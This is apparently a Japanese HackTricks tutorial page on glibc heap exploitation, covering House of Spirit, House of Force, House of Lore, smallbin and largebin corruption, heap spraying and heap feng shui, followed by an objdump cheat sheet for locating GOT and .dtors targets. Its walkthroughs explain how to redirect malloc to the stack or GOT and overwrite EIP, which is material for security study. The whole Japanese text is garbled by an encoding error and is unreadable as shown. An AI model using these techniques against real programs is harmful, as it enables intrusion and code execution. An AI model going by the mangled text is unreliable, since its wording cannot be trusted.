**ç²¾ç¥ã®å®¶**

ã“ã®å ´åˆã€æ”»æ’ƒè€…ã«ã‚ˆã£ã¦å¤‰æ›´å¯èƒ½ãªmallocã¸ã®ãƒã‚¤ãƒ³ã‚¿ã‚’æŒã¤ã“ã¨ã‚’ç›®æŒ‡ã—ã¾ã™ï¼ˆä¾‹ãˆã°ã€ãƒã‚¤ãƒ³ã‚¿ãŒå¤‰æ•°ã¸ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®ä¸‹ã«ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚ã‚‹å ´åˆï¼‰ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€ã“ã®ãƒã‚¤ãƒ³ã‚¿ã‚’ä»»æ„ã®å ´æ‰€ã«æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ã‹ã—ã€ã©ã®å ´æ‰€ã§ã‚‚æœ‰åŠ¹ã§ã¯ãªãã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã¯av->max\_fastã‚ˆã‚Šå°ã•ãã€ã‚ˆã‚Šå…·ä½“çš„ã«ã¯ã€å°†æ¥ã®malloc()å‘¼ã³å‡ºã—ã§è¦æ±‚ã•ã‚ŒãŸã‚µã‚¤ã‚º+8ã¨ç­‰ã—ããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®è„†å¼±ãªãƒã‚¤ãƒ³ã‚¿ã®å¾Œã«malloc(40)ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã¯48ã¨ç­‰ã—ããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚

ä¾‹ãˆã°ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ•°å­—ã‚’å°‹ã­ã‚‹å ´åˆã€48ã‚’å…¥åŠ›ã—ã¦ã€å¤‰æ›´å¯èƒ½ãªmallocãƒã‚¤ãƒ³ã‚¿ã‚’æ¬¡ã®4ãƒã‚¤ãƒˆï¼ˆé‹ãŒè‰¯ã‘ã‚Œã°EBPã«å±ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ï¼‰ã«æŒ‡ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€48ã¯å¾Œã‚ã«ã‚ã‚Šã€ã‚µã‚¤ã‚ºãƒ˜ãƒƒãƒ€ãƒ¼ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚ã•ã‚‰ã«ã€ptr-4+48ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯è¤‡æ•°ã®æ¡ä»¶ã‚’æº€ãŸã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã“ã®å ´åˆptr=EBPï¼‰ã€ã¤ã¾ã‚Šã€8 < ptr-4+48 < av->system\_memã€‚

ã“ã‚ŒãŒæº€ãŸã•ã‚Œã‚‹ã¨ã€æ¬¡ã®mallocãŒmalloc(40)ã¨å‘¼ã°ã‚Œã‚‹ã¨ãã€EBPã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ãŒã“ã®mallocã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹å ´åˆã€EBPã¨EIPã‚’ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ä¸Šæ›¸ãã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€free()ãŒè§£æ”¾ã™ã‚‹éš›ã«ã€ã‚¹ã‚¿ãƒƒã‚¯ã®EBPã‚’æŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã«å¯¾ã—ã¦æ–°ã—ã„malloc()ã®ãŸã‚ã«å®Œç’§ãªã‚µã‚¤ã‚ºã®ãƒãƒ£ãƒ³ã‚¯ãŒã‚ã‚‹ã“ã¨ã‚’è¨˜éŒ²ã™ã‚‹ãŸã‚ã«è¡Œã‚ã‚Œã‚‹ã¨æ€ã‚ã‚Œã¾ã™ã€‚

**åŠ›ã®å®¶**

å¿…è¦ãªã‚‚ã®:

* wildernessã‚’ä¸Šæ›¸ãã§ãã‚‹ãƒãƒ£ãƒ³ã‚¯ã¸ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚ŒãŸã‚µã‚¤ã‚ºã§malloc()ã‚’å‘¼ã³å‡ºã™
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’æŒã¤malloc()ã‚’å‘¼ã³å‡ºã™

æœ€åˆã«è¡Œã†ã“ã¨ã¯ã€wildernessãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã‚’éå¸¸ã«å¤§ããªå€¤ï¼ˆ0xffffffffï¼‰ã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ååˆ†ã«å¤§ããªãƒ¡ãƒ¢ãƒªè¦æ±‚ã¯\_int\_malloc()ã§å‡¦ç†ã•ã‚Œã€ãƒ’ãƒ¼ãƒ—ã‚’æ‹¡å¼µã™ã‚‹å¿…è¦ãŒãªããªã‚Šã¾ã™ã€‚

æ¬¡ã«ã€av->topã‚’æ”»æ’ƒè€…ã®åˆ¶å¾¡ä¸‹ã«ã‚ã‚‹ãƒ¡ãƒ¢ãƒªé ˜åŸŸã€ä¾‹ãˆã°ã‚¹ã‚¿ãƒƒã‚¯ã‚’æŒ‡ã™ã‚ˆã†ã«å¤‰æ›´ã—ã¾ã™ã€‚av->topã«ã¯\&EIP - 8ãŒè¨­å®šã•ã‚Œã¾ã™ã€‚

av->topã‚’æ”»æ’ƒè€…ã®åˆ¶å¾¡ä¸‹ã«ã‚ã‚‹ãƒ¡ãƒ¢ãƒªé ˜åŸŸã‚’æŒ‡ã™ã‚ˆã†ã«ä¸Šæ›¸ãã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimã¯ç¾åœ¨ã®wildernessãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆç¾åœ¨ã®av->topï¼‰ã®å€¤ã‚’å–å¾—ã—ã€remainderã¯ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«malloc()ã§è¦æ±‚ã•ã‚ŒãŸãƒã‚¤ãƒˆæ•°ã‚’åŠ ãˆãŸã‚‚ã®ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚‚ã—\&EIP-8ãŒ0xbffff224ã«ã‚ã‚Šã€av->topãŒ0x080c2788ã‚’å«ã‚“ã§ã„ã‚‹å ´åˆã€æ¬¡ã®malloc()ã®ãŸã‚ã«av->topãŒ$EIP-8ã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã€åˆ¶å¾¡ã•ã‚ŒãŸmallocã§äºˆç´„ã™ã‚‹å¿…è¦ãŒã‚ã‚‹é‡ã¯:

0xbffff224 - 0x080c2788 = 3086207644ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€av->topã«å¤‰æ›´ã•ã‚ŒãŸå€¤ãŒä¿å­˜ã•ã‚Œã€æ¬¡ã®mallocã¯EIPã‚’æŒ‡ã—ã€ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ–°ã—ã„wildernessãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºãŒã€æœ€å¾Œã®malloc()ã«ã‚ˆã£ã¦è¡Œã‚ã‚ŒãŸè¦æ±‚ã‚ˆã‚Šã‚‚å¤§ãã„ã“ã¨ãŒé‡è¦ã§ã™ã€‚ã¤ã¾ã‚Šã€wildernessãŒ\&EIP-8ã‚’æŒ‡ã—ã¦ã„ã‚‹å ´åˆã€ã‚µã‚¤ã‚ºã¯ã‚¹ã‚¿ãƒƒã‚¯ã®EBPãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«æ­£ç¢ºã«é…ç½®ã•ã‚Œã¾ã™ã€‚

**ä¼èª¬ã®å®¶**

**SmallBinã®ç ´æ**

è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã¯ã€ãã®ã‚µã‚¤ã‚ºã«åŸºã¥ã„ã¦binã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€æŒ¿å…¥ã•ã‚Œã‚‹å‰ã«unsorted binsã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ã€ã™ãã«ãã®binã«å…¥ã‚‹ã®ã§ã¯ãªãã€unsorted binsã«ç•™ã¾ã‚Šã¾ã™ã€‚æ¬¡ã«ã€æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ãŒäºˆç´„ã•ã‚Œã€ä»¥å‰ã«è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ãŒå½¹ç«‹ã¤å ´åˆã€ãã‚Œã‚’è¿”ã—ã¾ã™ãŒã€ã‚ˆã‚Šå¤§ããªã‚‚ã®ãŒäºˆç´„ã•ã‚Œã‚‹ã¨ã€unsorted binsã«ã‚ã‚‹è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ãŒé©åˆ‡ãªbinã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚

è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«åˆ°é”ã™ã‚‹ã«ã¯ã€ãƒ¡ãƒ¢ãƒªè¦æ±‚ãŒav->max\_fastï¼ˆé€šå¸¸72ï¼‰ã‚ˆã‚Šå¤§ããã€MIN\_LARGE\_SIZEï¼ˆ512ï¼‰ã‚ˆã‚Šå°ã•ããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚

binã«è¦æ±‚ã•ã‚ŒãŸã‚µã‚¤ã‚ºã«é©ã—ãŸãƒãƒ£ãƒ³ã‚¯ãŒã‚ã‚‹å ´åˆã€ãã‚ŒãŒè¿”ã•ã‚Œã€ã‚¢ãƒ³ãƒªãƒ³ã‚¯ã•ã‚Œã¾ã™:

bck = victim->bk; å‰ã®ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã—ã¾ã™ã€‚ã“ã‚ŒãŒå”¯ä¸€ã®æƒ…å ±ã§ã™ã€‚

bin->bk = bck; å‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒæœ€å¾Œã®ãƒãƒ£ãƒ³ã‚¯ã«ãªã‚Šã¾ã™ã€‚bckãŒã‚¹ã‚¿ãƒƒã‚¯ã‚’æŒ‡ã—ã¦ã„ã‚‹å ´åˆã€æ¬¡ã«äºˆç´„ã•ã‚Œã‚‹ãƒãƒ£ãƒ³ã‚¯ã«ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚

bck->fd = bin; ã“ã®ãƒªã‚¹ãƒˆã‚’é–‰ã˜ã€ã“ã‚ŒãŒbinã‚’æŒ‡ã™ã‚ˆã†ã«ã—ã¾ã™ã€‚

å¿…è¦ãªã‚‚ã®:

2ã¤ã®mallocã‚’äºˆç´„ã—ã€æœ€åˆã®ã‚‚ã®ãŒè§£æ”¾ã•ã‚ŒãŸå¾Œã«ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ï¼ˆã¤ã¾ã‚Šã€2ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã€binã«æŒ¿å…¥ã•ã‚ŒãŸå¾Œã«ã€ã‚ˆã‚Šå¤§ããªmallocãŒäºˆç´„ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

æ”»æ’ƒè€…ãŒé¸æŠã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒã¤mallocãŒæ”»æ’ƒè€…ã«ã‚ˆã£ã¦åˆ¶å¾¡ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ç›®çš„ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚ã‚‚ã—ã€ãƒ’ãƒ¼ãƒ—ã®ä¸‹ã«ã™ã§ã«è§£æ”¾ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ãŒã‚ã‚Šã€ãã®binã«ã‚ã‚‹å ´åˆã€bkãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚bkãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã—ã€ã“ã®ãƒãƒ£ãƒ³ã‚¯ãŒbinã®æœ€åˆã®ã‚‚ã®ã«ãªã‚Šã€äºˆç´„ã•ã‚Œã‚‹ã¨ã€binã‚’æ¬ºã„ã¦ã€ãƒªã‚¹ãƒˆã®æœ€å¾Œã®ãƒãƒ£ãƒ³ã‚¯ï¼ˆæ¬¡ã«æä¾›ã•ã‚Œã‚‹ã‚‚ã®ï¼‰ãŒã€æ”»æ’ƒè€…ãŒæŒ‡å®šã—ãŸå½ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ã‚‹ã¨èªè­˜ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ã‚„GOTãªã©ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€å†åº¦åˆ¥ã®ãƒãƒ£ãƒ³ã‚¯ãŒäºˆç´„ã•ã‚Œã€æ”»æ’ƒè€…ãŒãã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€å¸Œæœ›ã™ã‚‹ä½ç½®ã«ãƒãƒ£ãƒ³ã‚¯ãŒä¸ãˆã‚‰ã‚Œã€ãã“ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚

å¤‰æ›´ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã‚’è§£æ”¾ã—ãŸå¾Œã€è§£æ”¾ã•ã‚ŒãŸã‚‚ã®ã‚ˆã‚Šã‚‚å¤§ããªãƒãƒ£ãƒ³ã‚¯ã‚’äºˆç´„ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å¤‰æ›´ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ãŒunsorted binsã‹ã‚‰å‡ºã¦ã€é©åˆ‡ãªbinã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚

binã«å…¥ã£ãŸã‚‰ã€ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’ä»‹ã—ã¦bkãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã—ã¦ã€ä¸Šæ›¸ãã—ãŸã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã‚ˆã†ã«ã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ã«ã—ã¦ã€binã¯malloc()ãŒååˆ†ã«å‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’å¾…ã¤å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€å¤‰æ›´ã•ã‚ŒãŸbinãŒå†åˆ©ç”¨ã•ã‚Œã€æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ãŒå½ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã‚ã‚‹ã¨ä¿¡ã˜è¾¼ã¾ã›ã¾ã™ã€‚ãã—ã¦ã€æ¬¡ã«èˆˆå‘³ã®ã‚ã‚‹ãƒãƒ£ãƒ³ã‚¯ãŒæä¾›ã•ã‚Œã¾ã™ã€‚

è„†å¼±æ€§ã‚’ã§ãã‚‹ã ã‘æ—©ãå®Ÿè¡Œã™ã‚‹ã«ã¯ã€ç†æƒ³çš„ã«ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™: è„†å¼±ãªãƒãƒ£ãƒ³ã‚¯ã®äºˆç´„ã€å¤‰æ›´ã•ã‚Œã‚‹ãƒãƒ£ãƒ³ã‚¯ã®äºˆç´„ã€ã“ã®ãƒãƒ£ãƒ³ã‚¯ã®è§£æ”¾ã€ã‚ˆã‚Šå¤§ããªãƒãƒ£ãƒ³ã‚¯ã®äºˆç´„ã€ãƒãƒ£ãƒ³ã‚¯ã®å¤‰æ›´ï¼ˆè„†å¼±æ€§ï¼‰ã€è„†å¼±ãªã‚µã‚¤ã‚ºã¨åŒã˜ã‚µã‚¤ã‚ºã®ãƒãƒ£ãƒ³ã‚¯ã®äºˆç´„ã€ãã—ã¦ã“ã®ãƒãƒ£ãƒ³ã‚¯ãŒé¸æŠã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã“ã¨ã«ãªã‚Šã¾ã™ã€‚

ã“ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã€ãƒãƒ£ãƒ³ã‚¯ãŒã€Œå½ã€ã§ãªã„ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã®å…¸å‹çš„ãªãƒã‚§ãƒƒã‚¯ãŒä½¿ç”¨ã•ã‚Œã¾ã™: bck->fdãŒvictimã‚’æŒ‡ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€ç§ãŸã¡ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã§æŒ‡ã•ã‚Œã¦ã„ã‚‹å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ãƒã‚¤ãƒ³ã‚¿fd*ãŒvictimã‚’æŒ‡ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã§ã™ã€‚ã“ã®ä¿è­·ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯ä½•ã‚‰ã‹ã®æ–¹æ³•ã§ï¼ˆãŠãã‚‰ãã‚¹ã‚¿ãƒƒã‚¯ã‚’ä»‹ã—ã¦ï¼‰é©åˆ‡ãªã‚¢ãƒ‰ãƒ¬ã‚¹ã«victimã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã†ã™ã‚Œã°ã€çœŸã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚

**LargeBinã®ç ´æ**

ä»¥å‰ã¨åŒã˜è¦ä»¶ãŒå¿…è¦ã§ã€ã•ã‚‰ã«ã€äºˆç´„ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã¯512ã‚ˆã‚Šå¤§ãããªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚

æ”»æ’ƒã¯å‰ã¨åŒæ§˜ã§ã€bkãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã™ã¹ã¦ã®malloc()å‘¼ã³å‡ºã—ãŒå¿…è¦ã§ã™ãŒã€ã•ã‚‰ã«ã€å¤‰æ›´ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã®ã‚µã‚¤ã‚ºã‚’ãã®ã‚µã‚¤ã‚º - nbãŒ<MINSIZEã«ãªã‚‹ã‚ˆã†ã«å¤‰æ›´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä¾‹ãˆã°ã€ã‚µã‚¤ã‚ºã‚’1552ã«è¨­å®šã™ã‚‹ã¨ã€1552 - 1544 = 8 < MINSIZEã«ãªã‚Šã¾ã™ï¼ˆå¼•ãç®—ã¯è² ã«ãªã£ã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€unsignedãŒæ¯”è¼ƒã•ã‚Œã‚‹ã‹ã‚‰ã§ã™ï¼‰ã€‚

ã•ã‚‰ã«ã€ã•ã‚‰ã«è¤‡é›‘ã«ã™ã‚‹ãŸã‚ã®ãƒ‘ãƒƒãƒãŒå°å…¥ã•ã‚Œã¾ã—ãŸã€‚

**ãƒ’ãƒ¼ãƒ—ã‚¹ãƒ—ãƒ¬ãƒ¼**

åŸºæœ¬çš„ã«ã¯ã€å¯èƒ½ãªé™ã‚Šã™ã¹ã¦ã®ãƒ’ãƒ¼ãƒ—ãƒ¡ãƒ¢ãƒªã‚’äºˆç´„ã—ã€ã“ã‚Œã‚’nopsã®ãƒãƒƒãƒˆãƒ¬ã‚¹ã¨ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã§åŸ‹ã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã•ã‚‰ã«ã€ãƒãƒƒãƒˆãƒ¬ã‚¹ã¨ã—ã¦0x0cã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€0x0c0c0c0cã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«é£›ã¼ã†ã¨ã—ã€ãã“ã«å‘¼ã³å‡ºã•ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒä¸Šæ›¸ãã•ã‚Œã‚‹ã¨ã€ãã“ã«é£›ã³ã¾ã™ã€‚åŸºæœ¬çš„ã«ã€ã“ã®æˆ¦è¡“ã¯ã€ã§ãã‚‹ã ã‘å¤šãã®äºˆç´„ã‚’è¡Œã„ã€ãƒã‚¤ãƒ³ã‚¿ãŒä¸Šæ›¸ãã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã€0x0c0c0c0cã«é£›ã¶ã“ã¨ã‚’æœŸå¾…ã—ã¦ã„ã¾ã™ã€‚

**ãƒ’ãƒ¼ãƒ—é¢¨æ°´**

äºˆç´„ã¨è§£æ”¾ã‚’é€šã˜ã¦ã€ãƒ¡ãƒ¢ãƒªã‚’ã‚»ã‚°ãƒ¡ãƒ³ãƒˆåŒ–ã—ã€ç©ºããƒãƒ£ãƒ³ã‚¯ã®é–“ã«äºˆç´„ã•ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯ã‚’é…ç½®ã—ã¾ã™ã€‚ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã™ã‚‹ãƒãƒƒãƒ•ã‚¡ã¯ã€ã“ã‚Œã‚‰ã®åµã®1ã¤ã«é…ç½®ã•ã‚Œã¾ã™ã€‚

**objdump -d å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«** â€”> é–¢æ•°ã‚’é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã—ã¾ã™ã€‚\
**objdump -d ./PROGRAM | grep FUNCTION** â€”> é–¢æ•°ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã¾ã™ã€‚\
**objdump -d -Mintel ./shellcodeout** â€”> å®Ÿéš›ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã€OpCodesã‚’å–å¾—ã—ã¾ã™ã€‚\
**objdump -t ./exec | grep varBss** â€”> ã‚·ãƒ³ãƒœãƒ«ãƒ†ãƒ¼ãƒ–ãƒ«ã€å¤‰æ•°ã¨é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã¾ã™ã€‚\
**objdump -TR ./exec | grep exit(func lib)** â€”> ãƒ©ã‚¤ãƒ–ãƒ©ãƒªé–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã¾ã™ï¼ˆGOTï¼‰ã€‚\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> GOTã§ä¸Šæ›¸ãã™ã‚‹putsã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã¾ã™ã€‚\
**objdump -D ./exec** â€”> pltã®ã‚¨ãƒ³ãƒˆãƒªã¾ã§å…¨ã¦ã‚’é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã—ã¾ã™ã€‚\
**objdump -p -/exec**\
**Info functions strncmp â€”>** gdbã§ã®é–¢æ•°æƒ…å ±

## èˆˆå‘³æ·±ã„ã‚³ãƒ¼ã‚¹

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **å‚è€ƒæ–‡çŒ®**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
